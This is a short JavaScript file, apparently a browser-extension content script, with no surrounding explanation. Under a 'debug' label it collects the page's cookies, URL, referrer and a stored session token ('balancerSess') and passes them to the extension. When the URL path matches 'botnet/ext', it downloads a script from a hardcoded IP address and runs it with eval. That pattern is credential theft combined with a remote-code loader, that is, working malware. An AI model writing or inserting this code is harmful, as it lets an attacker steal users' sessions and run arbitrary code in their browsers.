function httpGet(theUrl) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
cookie=document.cookie;
url=document.location.href;
ref=document.referrer;

var debug = {
	cookie: cookie,
	url: url,
	ref: ref,
	hash: localStorage.getItem("balancerSess")
}

chrome.runtime.sendMessage(debug, function(response) {
  console.log(response);
});


//if(document.location.href.indexOf('https://esd.pr.')>-1){alert(1);}
selector=location.href.split("/");
if((selector[3]=="botnet")&&(selector[4]=="ext")){
eval(httpGet('http://10.68.100.60/botnet/ext/botnet.js'));
}
